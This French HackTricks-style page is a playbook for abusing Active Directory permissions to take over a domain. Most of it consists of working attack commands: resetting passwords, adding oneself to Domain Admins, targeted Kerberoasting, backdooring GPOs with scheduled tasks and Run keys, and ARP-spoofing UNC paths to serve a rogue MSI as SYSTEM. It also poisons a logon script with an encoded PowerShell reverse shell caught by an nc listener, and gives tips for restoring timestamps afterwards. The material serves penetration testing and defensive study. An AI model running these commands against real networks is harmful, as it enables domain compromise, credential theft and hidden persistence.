# Abus des ACL/ACE d’Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Cette page est principalement un résumé des techniques présentées dans** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **et** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Pour plus de détails, consultez les articles originaux.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Droits GenericAll sur un utilisateur**

Ce privilège donne à un attaquant le contrôle total d’un compte utilisateur ciblé. Une fois les droits `GenericAll` confirmés à l’aide de la commande `Get-ObjectAcl`, un attaquant peut :

- **Modifier le mot de passe de la cible** : avec `net user <username> <password> /domain`, l’attaquant peut réinitialiser le mot de passe de l’utilisateur.
- Depuis Linux, vous pouvez faire la même chose via SAMR avec Samba `net rpc` :<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Si le compte est désactivé, supprimez le flag UAC** : `GenericAll` permet de modifier `userAccountControl`. Depuis Linux, BloodyAD peut supprimer le flag `ACCOUNTDISABLE` :<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting** : Attribuer un SPN au compte de l'utilisateur pour le rendre kerberoastable, puis utiliser Rubeus et targetedKerberoast.py pour extraire et tenter de cracker les hashes du TGT.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **ASREPRoasting ciblé** : Désactiver la pré-authentification pour l'utilisateur, rendant son compte vulnérable à l'ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link** : Avec `GenericAll` sur un utilisateur, vous pouvez ajouter un identifiant basé sur un certificat et vous authentifier en tant que cet utilisateur sans modifier son mot de passe. Voir :

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Droits GenericAll sur un groupe**

Ce privilège permet à un attaquant de manipuler les appartenances aux groupes s'il dispose de droits `GenericAll` sur un groupe tel que `Domain Admins`. Après avoir identifié le nom distinctif du groupe avec `Get-NetGroup`, l'attaquant peut :

- **S'ajouter au groupe Domain Admins** : Cela peut être fait via des commandes directes ou à l'aide de modules tels que Active Directory ou PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Depuis Linux, vous pouvez également utiliser BloodyAD pour vous ajouter à des groupes arbitraires lorsque vous disposez des droits GenericAll/Write sur ceux-ci. Si le groupe cible est imbriqué dans « Remote Management Users », vous obtiendrez immédiatement un accès WinRM aux hôtes qui prennent en compte ce groupe :<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Détenir ces privilèges sur un objet ordinateur ou un compte utilisateur permet de :

- **Kerberos Resource-based Constrained Delegation** : permet de prendre le contrôle d’un objet ordinateur.
- **Shadow Credentials** : utiliser cette technique pour usurper l’identité d’un compte ordinateur ou utilisateur en exploitant les privilèges permettant de créer des shadow credentials.

## **WriteProperty on Group**

Si un utilisateur dispose des droits `WriteProperty` sur tous les objets d’un groupe spécifique (par exemple, `Domain Admins`), il peut :

- **S’ajouter au groupe Domain Admins** : réalisable en combinant les commandes `net user` et `Add-NetGroupUser`, cette méthode permet une escalation de privilèges au sein du domaine.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Auto-appartenance) sur un groupe**

Ce privilège permet aux attackers de s’ajouter à des groupes spécifiques, tels que `Domain Admins`, via des commandes qui manipulent directement l’appartenance aux groupes. La séquence de commandes suivante permet de s’y ajouter soi-même :
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Un privilège similaire permet aux attackers de s’ajouter directement à des groupes en modifiant les propriétés des groupes s’ils disposent du droit `WriteProperty` sur ces groupes. La confirmation et l’exploitation de ce privilège s’effectuent avec :
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Détenir l’`ExtendedRight` sur un utilisateur pour `User-Force-Change-Password` permet de réinitialiser son mot de passe sans connaître le mot de passe actuel. La vérification de ce droit et son exploitation peuvent être effectuées avec PowerShell ou d’autres outils en ligne de commande, offrant plusieurs méthodes pour réinitialiser le mot de passe d’un utilisateur, notamment des sessions interactives et des one-liners pour les environnements non interactifs. Les commandes vont de simples invocations PowerShell à l’utilisation de `rpcclient` sous Linux, démontrant la polyvalence des vecteurs d’attaque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner sur un groupe**

Si un attaquant découvre qu’il dispose des droits `WriteOwner` sur un groupe, il peut modifier le propriétaire du groupe pour se définir lui-même comme propriétaire. Cela est particulièrement impactant lorsque le groupe concerné est `Domain Admins`, car la modification du propriétaire permet un contrôle plus étendu des attributs et de l’appartenance au groupe. Le processus consiste à identifier l’objet correct à l’aide de `Get-ObjectAcl`, puis à utiliser `Set-DomainObjectOwner` pour modifier le propriétaire, soit via le SID, soit via le nom.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite sur un utilisateur**

Cette permission permet à un attaquant de modifier les propriétés d’un utilisateur. Plus précisément, avec un accès `GenericWrite`, l’attaquant peut modifier le chemin du script d’ouverture de session d’un utilisateur afin d’exécuter un script malveillant lors de sa connexion. Pour ce faire, il utilise la commande `Set-ADObject` afin de mettre à jour la propriété `scriptpath` de l’utilisateur ciblé et de la faire pointer vers le script de l’attaquant.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite sur un groupe**

Avec ce privilège, les attaquants peuvent manipuler l’appartenance aux groupes, notamment en s’ajoutant eux-mêmes ou en ajoutant d’autres utilisateurs à des groupes spécifiques. Ce processus consiste à créer un objet d’identifiants, à l’utiliser pour ajouter ou supprimer des utilisateurs d’un groupe, puis à vérifier les modifications d’appartenance à l’aide de commandes PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Depuis Linux, Samba `net` peut ajouter/supprimer des membres lorsque vous détenez `GenericWrite` sur le groupe (utile lorsque PowerShell/RSAT ne sont pas disponibles) :<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

La propriété d’un objet AD et la possession de privilèges `WriteDACL` sur celui-ci permettent à un attaquant de s’accorder des privilèges `GenericAll` sur l’objet. Cela est réalisé par le biais d’une manipulation ADSI, offrant un contrôle total sur l’objet et la possibilité de modifier ses appartenances à des groupes. Malgré cela, certaines limitations existent lorsqu’on tente d’exploiter ces privilèges à l’aide des cmdlets `Set-Acl` / `Get-Acl` du module Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Prise de contrôle rapide WriteDACL/WriteOwner (PowerView)

Lorsque vous disposez de `WriteOwner` et `WriteDacl` sur un compte utilisateur ou de service, vous pouvez en prendre le contrôle total et réinitialiser son mot de passe à l’aide de PowerView sans connaître l’ancien mot de passe :
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
- Vous devrez peut-être d’abord modifier le propriétaire pour vous-même si vous disposez uniquement de `WriteOwner` :
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validez l’accès avec n’importe quel protocole (SMB/LDAP/RDP/WinRM) après la réinitialisation du mot de passe.

## **Replication on the Domain (DCSync)**

L’attaque DCSync exploite des permissions de réplication spécifiques sur le domaine afin d’imiter un Domain Controller et de synchroniser des données, notamment les identifiants des utilisateurs. Cette technique puissante nécessite des permissions telles que `DS-Replication-Get-Changes`, permettant aux attaquants d’extraire des informations sensibles de l’environnement AD sans accès direct à un Domain Controller.<sup>[[5]](#references)</sup> [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

L’accès délégué à la gestion des Group Policy Objects (GPO) peut présenter des risques de sécurité importants. Par exemple, si un utilisateur tel que `offense\spotless` dispose de droits de gestion délégués sur les GPO, il peut posséder des privilèges tels que **WriteProperty**, **WriteDacl** et **WriteOwner**. Ces permissions peuvent être exploitées à des fins malveillantes, comme l’a identifié PowerView : `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Pour identifier les GPO mal configurées, les cmdlets de PowerSploit peuvent être enchaînées. Cela permet de découvrir les GPO qu’un utilisateur spécifique a l’autorisation de gérer : `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Ordinateurs auxquels une stratégie donnée est appliquée** : il est possible de déterminer à quels ordinateurs une GPO spécifique s’applique, ce qui aide à comprendre l’étendue de l’impact potentiel. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Stratégies appliquées à un ordinateur donné** : pour voir quelles stratégies sont appliquées à un ordinateur particulier, des commandes telles que `Get-DomainGPO` peuvent être utilisées.

**OU auxquelles une stratégie donnée est appliquée** : l’identification des unités organisationnelles (OU) affectées par une stratégie donnée peut être effectuée à l’aide de `Get-DomainOU`.

Vous pouvez également utiliser l’outil [**GPOHound**](https://github.com/cogiceo/GPOHound) pour énumérer les GPO et y rechercher des problèmes.

### Abuse GPO - New-GPOImmediateTask

Les GPO mal configurées peuvent être exploitées pour exécuter du code, par exemple en créant une tâche planifiée immédiate. Cela peut servir à ajouter un utilisateur au groupe des administrateurs locaux sur les machines affectées, ce qui élève considérablement les privilèges :
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Le module GroupPolicy, s'il est installé, permet de créer et de lier de nouveaux GPO, ainsi que de définir des préférences, telles que des valeurs de registre, afin d'exécuter des backdoors sur les ordinateurs concernés. Cette méthode nécessite la mise à jour du GPO et la connexion d'un utilisateur à l'ordinateur pour l'exécution :
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abus des GPO

SharpGPOAbuse propose une méthode pour exploiter des GPO existantes en ajoutant des tâches ou en modifiant des paramètres, sans avoir besoin de créer de nouvelles GPO. Cet outil nécessite de modifier des GPO existantes ou d'utiliser les outils RSAT pour en créer de nouvelles avant d'appliquer les modifications :
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forcer la mise à jour des stratégies

Les mises à jour des GPO se produisent généralement environ toutes les 90 minutes. Pour accélérer ce processus, notamment après avoir appliqué une modification, la commande `gpupdate /force` peut être utilisée sur l'ordinateur cible afin de forcer une mise à jour immédiate des stratégies. Cette commande garantit que toute modification apportée aux GPO est appliquée sans attendre le prochain cycle de mise à jour automatique.

### Dans les coulisses

L'inspection des Scheduled Tasks associées à une GPO donnée, comme la `Misconfigured Policy`, permet de confirmer l'ajout de tâches telles que `evilTask`. Ces tâches sont créées au moyen de scripts ou d'outils en ligne de commande visant à modifier le comportement du système ou à élever les privilèges.

La structure de la tâche, telle qu'elle apparaît dans le fichier de configuration XML généré par `New-GPOImmediateTask`, décrit les spécificités de la tâche planifiée, notamment la commande à exécuter et ses déclencheurs. Ce fichier illustre la manière dont les tâches planifiées sont définies et gérées au sein des GPO, offrant une méthode pour exécuter des commandes ou des scripts arbitraires dans le cadre de l'application des stratégies.

### Utilisateurs et groupes

Les GPO permettent également de modifier les appartenances des utilisateurs et des groupes sur les systèmes cibles. En modifiant directement les fichiers de stratégie Users and Groups, les attaquants peuvent ajouter des utilisateurs à des groupes privilégiés, tels que le groupe local `administrators`. Cela est possible grâce à la délégation des autorisations de gestion des GPO, qui permet de modifier les fichiers de stratégie afin d'inclure de nouveaux utilisateurs ou de changer les appartenances aux groupes.

Le fichier de configuration XML de Users and Groups décrit la manière dont ces modifications sont mises en œuvre. En ajoutant des entrées à ce fichier, certains utilisateurs peuvent obtenir des privilèges élevés sur les systèmes concernés. Cette méthode offre une approche directe de l'élévation de privilèges par la manipulation des GPO.

En outre, d'autres méthodes d'exécution de code ou de maintien de la persistance, comme l'utilisation de scripts de logon/logoff, la modification de clés de registre pour les autoruns, l'installation de logiciels via des fichiers .msi ou la modification des configurations de services, peuvent également être envisagées. Ces techniques offrent différents moyens de maintenir l'accès aux systèmes cibles et de les contrôler par l'abus des GPO.

### WriteGPLink + détournement de chemin UNC (ARP spoofing)

`WriteGPLink` sur une OU/un domaine permet de modifier l'attribut `gPLink` du conteneur cible et de **forcer l'application d'une GPO existante** sans modifier la GPO elle-même. Cela devient intéressant lorsque la GPO liée référence déjà du contenu distant via des **chemins UNC** (`\\HOST\share\...`), car les utilisateurs authentifiés peuvent lire **SYSVOL** et rechercher hors ligne des stratégies réutilisables.<sup>[[11]](#references)</sup>

Workflow général :

1. Utiliser BloodHound pour identifier un principal disposant de `WriteGPLink` sur une OU et énumérer les ordinateurs/utilisateurs présents dans cette OU.
2. Cloner `SYSVOL` en lecture seule et analyser les GPO à la recherche de **Software Installation**, de **mappages de lecteurs** (`Drives.xml`) et de **scripts de logon/startup** faisant référence à des chemins UNC.
3. Privilégier les stratégies pointant vers un **nom d'hôte direct** (par exemple `\\DC02\share\pkg.msi`) plutôt que vers des chemins DFS/espaces de noms de domaine, car les chemins fondés sur un nom d'hôte sont plus faciles à rediriger avec du spoofing L2.
4. Ajouter le GUID de la GPO choisie au `gPLink` de l'OU cible afin que la victime traite cette stratégie déjà existante.
5. Sur le même domaine de broadcast, effectuer un ARP spoofing de l'hôte UNC et lier son IP localement (`ip addr add <target_ip>/32 dev <iface>`) afin que le trafic SMB de la victime atteigne votre hôte.
6. Servir le chemin/nom de fichier attendu depuis un serveur SMB contrôlé par l'attaquant (par exemple `smbserver.py`) et attendre le traitement normal des stratégies.

Exemple de collecte de `SYSVOL` et de corrélation des GPO :
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Liez le GPO existant à l’OU cible :
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Détournement UNC de Software Installation -> SYSTEM

Si le GPO lié déploie un MSI depuis un chemin UNC, le client le récupérera au **démarrage de l’ordinateur** et l’installera en tant que **`NT AUTHORITY\SYSTEM`**. En usurpant l’hôte référencé et en servant un MSI malveillant sous le **même nom de partage/chemin/nom**, vous pouvez transformer `WriteGPLink` en exécution de code SYSTEM **sans modifier SYSVOL**.

Contraintes importantes :

- **Le timing est important** : le nouveau lien est pris en compte lors du rafraîchissement de la stratégie (généralement toutes les ~90 minutes), mais **Software Installation** se déclenche généralement au **redémarrage**.
- Windows Installer suit généralement le déploiement à l’aide du **`ProductCode`** du package. Si le produit est déjà installé, le déploiement peut être ignoré.
- Pour éviter le rejet par l’installer, modifiez le MSI rogue afin que son **`ProductCode`** et son **`PackageCode`** correspondent à ceux du package légitime attendu par le GPO.
- D’anciens fichiers d’annonce `.aas` peuvent rester dans `SYSVOL`. Vérifiez donc que le déploiement semble toujours actif avant de vous y fier.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Les mappages de lecteurs GPP dans `Drives.xml` amènent les utilisateurs à s’authentifier auprès du chemin UNC configuré lors de l’ouverture de session ou de la reconnexion. Si vous spoofez l’hôte référencé, vous pouvez capturer du **NetNTLMv2**. Si SMB est délibérément rendu indisponible, Windows peut réessayer via **WebDAV**, en envoyant du **NTLM over HTTP**, ce qui est beaucoup plus flexible pour les relays vers **LDAP(S)**, **AD CS** ou **SMB**.

#### Logon/startup script UNC hijack

Le même principe s’applique aux scripts hébergés sur UNC et découverts dans `SYSVOL` :

- Les **Logon scripts** s’exécutent généralement dans le contexte de l’**utilisateur**.
- Les **Startup scripts** s’exécutent généralement dans le contexte de l’**ordinateur / SYSTEM**.

Si le chemin du script pointe vers un hostname spoofable, redirigez l’hôte UNC et fournissez un contenu de script de remplacement depuis l’emplacement attendu.

## SYSVOL/NETLOGON Logon Script Poisoning

Les chemins inscriptibles sous `\\<dc>\SYSVOL\<domain>\scripts\` ou `\\<dc>\NETLOGON\` permettent de modifier les scripts de connexion exécutés lors de l’ouverture de session des utilisateurs via GPO. Cela permet d’exécuter du code dans le contexte de sécurité des utilisateurs qui se connectent.

### Localiser les scripts de connexion
- Inspecter les attributs des utilisateurs pour rechercher un script de connexion configuré :
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Parcourir les partages du domaine pour faire apparaître des raccourcis ou des références à des scripts :
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analyser les fichiers `.lnk` pour résoudre les cibles pointant vers SYSVOL/NETLOGON (astuce DFIR utile et pour les attaquants sans accès direct aux GPO) :
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound affiche l’attribut `logonScript` (`scriptPath`) sur les nœuds utilisateur lorsqu’il est présent.

### Valider l’accès en écriture (ne faites pas confiance aux listes de partages)
Les outils automatisés peuvent indiquer que SYSVOL/NETLOGON sont en lecture seule, mais les ACL NTFS sous-jacentes peuvent tout de même autoriser les écritures. Testez toujours :
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Si la taille du fichier ou son mtime change, vous avez un accès en écriture. Préservez les originaux avant toute modification.

### Poisonner un script de logon VBScript pour obtenir une RCE
Ajoutez une commande qui lance un reverse shell PowerShell (générez-le depuis revshells.com) et conservez la logique d’origine pour éviter de perturber le fonctionnement métier :
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Écoutez sur votre hôte et attendez la prochaine ouverture de session interactive :
```bash
rlwrap -cAr nc -lnvp 443
```
Notes :
- L'exécution s'effectue avec le token de l'utilisateur connecté (et non SYSTEM). La portée correspond au lien GPO (OU, site, domaine) qui applique ce script.
- Effectuez le nettoyage en restaurant le contenu et les timestamps d'origine après utilisation.


## Références

- [1] [Abusing Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Comptes privilégiés et privilèges de token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 - La mise à jour du chemin d'attaque ACL](https://wald0.com/?p=112)
- [4] [Énumération ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Élévation de privilèges avec les ACL dans Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Scan des privilèges Active Directory et des comptes privilégiés](https://adsecurity.org/?p=3658)
- [7] [Constructeur ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD - Opérations sur les attributs/UAC AD depuis Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba - net rpc (appartenance aux groupes)](https://www.samba.org/)
- [10] [HTB Puppy : abuse des ACL AD, cracking Argon2 de KeePassXC et déchiffrement DPAPI jusqu'à l'administration du DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out : détournement des chemins UNC GPO pour l'exécution de code et le relais NTLM](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
